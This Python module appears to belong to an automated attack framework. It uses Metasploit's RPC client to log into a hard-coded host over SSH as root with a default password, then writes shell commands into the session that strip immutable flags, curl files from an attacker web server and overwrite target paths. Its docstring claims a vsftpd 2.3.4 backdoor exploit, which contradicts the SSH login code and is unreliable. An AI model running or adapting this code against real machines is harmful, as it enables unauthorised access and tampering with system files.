#!/usr/bin/python3

from .base import Module
import socket
import time
from metasploit.msfrpc import MsfRpcClient
from ..payloads.basicpayload import BasicPayload
from ..utils.encoding import hex_reprb
from ..utils import common
import random


class MSFSSHDefaultPassword(Module):
    """Exploits the vsftpd 2.3.4 backdoor (Primary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        return True

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be socket we used to test for compromise
        # Saves an open socket

        payload = self.payload

        try:
            client = MsfRpcClient("password", server="192.168.1.59")
            exploit = client.modules.use("auxiliary", 'scanner/ssh/ssh_login')
            exploit["USERNAME"] = "root"
            exploit["PASSWORD"] = "password"
            exploit["RHOSTS"] = "192.168.1.65"
            ticket = exploit.execute()

            time.sleep(0.25)
            if not client.sessions.list:
                return False

            s = None
            for i in client.sessions.list:
                if client.sessions.list[i]['exploit_uuid'] == ticket['uuid']:
                    s = client.sessions.session(i)
                    break

            if s == None:
                return False

            for i in self.payload.files.keys():
                self.drop_file(s, i, payload.files[i])

            for i in self.payload.steps():
                s.write(i + "\n")

            s.write("exit\n")
        except:
            import traceback
            traceback.print_exc()

        return True

    def drop_file(self, sock, fl, location):
        """Drops files using webserver. Paths are relative to resources"""
        send_port = common.http_port
        send_host = common.host_ip
        sock.write("chattr -i %s\n" % location)
        sock.write("chmod +w %s\n" % location)
        rand = random.randrange(1000000)
        sock.write("curl http://%s:%d/%s > /tmp/tmp.%s\n" % (send_host,
                                                                send_port,
                                                                fl, rand))
        sock.write("mv -f /tmp/tmp.%s %s\n" % (rand, location))
